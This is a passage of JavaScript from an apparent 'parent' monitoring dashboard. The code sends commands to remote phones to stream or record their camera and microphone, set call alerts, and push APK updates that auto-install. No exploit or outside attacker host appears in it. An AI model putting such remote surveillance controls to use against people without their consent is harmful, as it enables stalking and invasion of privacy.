            addActivity(`📦 Uploading ${file.name} (${formatBytes(file.size)})…`, 'system');
            document.getElementById('btn-push-update').disabled = true;
            document.getElementById('btn-push-update').textContent = '⏳ Uploading…';

            try {
                const formData = new FormData();
                formData.append('file', file);

                const resp = await fetch(`/api/upload-apk?token=${encodeURIComponent(token)}`, {
                    method: 'POST',
                    body: formData
                });
                const result = await resp.json();

                if (result.status === 'ok') {
                    addActivity(`✅ APK uploaded (${result.size_mb} MB) — update pushed to ${result.pushed_to} device(s). Auto-installing…`, 'system');
                } else {
                    addActivity(`❌ Upload failed: ${result.error || resp.statusText}`, 'system');
                }
            } catch (err) {
                addActivity(`❌ Upload error: ${err.message}`, 'system');
            } finally {
                document.getElementById('btn-push-update').disabled = false;
                document.getElementById('btn-push-update').textContent = '📦 Push Update';
            }
        };
        input.click();
    });

    document.getElementById('btn-set-call-alerts')?.addEventListener('click', () => {
        const numbers = document.getElementById('call-alert-numbers').value.trim();
        sendCommand({ command: 'SET_CALL_ALERTS', numbers: numbers });
        addActivity(`📞 Call alerts updated: ${numbers || 'None'}`, 'command');
    });

    document.getElementById('btn-camera-on')?.addEventListener('click', () => {
        const facing = document.getElementById('camera-facing').value;
        sendCommand({ command: 'START_CAMERA', facing: facing });
        document.getElementById('btn-camera-on').style.display  = 'none';
        document.getElementById('btn-camera-off').style.display = '';
        addActivity('📷 Camera stream started', 'command');
    });
    
    document.getElementById('btn-record-camera')?.addEventListener('click', () => {
        const facing = document.getElementById('camera-facing').value;
        const duration = parseInt(document.getElementById('camera-duration').value);
        sendCommand({ command: 'START_RECORDING_CAMERA', facing: facing, duration: duration });
        addActivity(`⏺ Camera recording requested for ${duration/1000}s`, 'command');
        // If stream is running, it will stop automatically on the device side
    });
    
    document.getElementById('btn-camera-off')?.addEventListener('click', () => {
        sendCommand({ command: 'STOP_CAMERA' });
        document.getElementById('btn-camera-on').style.display  = '';
        document.getElementById('btn-camera-off').style.display = 'none';
        document.getElementById('camera-feed').style.display = 'none';
        document.getElementById('camera-placeholder').style.display = '';
        addActivity('📷 Camera stopped', 'command');
    });

    document.getElementById('btn-mic-on')?.addEventListener('click', () => {
        if (!confirm('Start live microphone monitoring?\nAudio will be streamed to this browser.')) return;
        sendCommand({ command: 'START_MIC' });
        document.getElementById('btn-mic-on').style.display  = 'none';
        document.getElementById('btn-mic-off').style.display = '';
        addActivity('🎤 Mic stream started', 'command');
    });
    
    document.getElementById('btn-record-mic')?.addEventListener('click', () => {
        const duration = parseInt(document.getElementById('mic-duration').value);
        sendCommand({ command: 'START_RECORDING_MIC', duration: duration });
        addActivity(`⏺ Mic recording requested for ${duration/1000}s`, 'command');
    });
    
    document.getElementById('btn-mic-off')?.addEventListener('click', () => {
        sendCommand({ command: 'STOP_MIC' });
        document.getElementById('btn-mic-on').style.display  = '';
        document.getElementById('btn-mic-off').style.display = 'none';
        const canvas = document.getElementById('audio-canvas');
        if (canvas) canvas.style.display = 'none';
        document.getElementById('mic-placeholder').style.display = '';
        addActivity('🎤 Mic stopped', 'command');
    });

    // ─── UI Helpers ───────────────────────────────────────────────────
    function setServerStatus(connected) {
        statusDot.className  = `status-dot ${connected ? 'online' : 'offline'}`;
        statusText.textContent = connected ? 'Connected (Parent)' : 'Disconnected';
    }

    function addActivity(message, type = 'system') {
        const li = document.createElement('li');
        li.className = `feed-item ${type}`;
        li.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
        activityFeed.insertBefore(li, activityFeed.firstChild);
        if (activityFeed.children.length > 100) activityFeed.removeChild(activityFeed.lastChild);
    }

    function setText(id, value) {
        const el = document.getElementById(id);
        if (el) el.textContent = value ?? '—';
    }

    function formatDuration(seconds) {
        if (!seconds) return '0s';
        if (seconds < 60) return `${seconds}s`;
        return `${Math.floor(seconds / 60)}m ${seconds % 60}s`;
    }

    function formatBytes(bytes) {
        if (bytes === 0) return '0 B';
        const k = 1024;
        const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
    }

    function escapeHtml(str) {
        if (!str) return '';
        return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
    }

    // ─── Boot ─────────────────────────────────────────────────────────
    connect();

})();
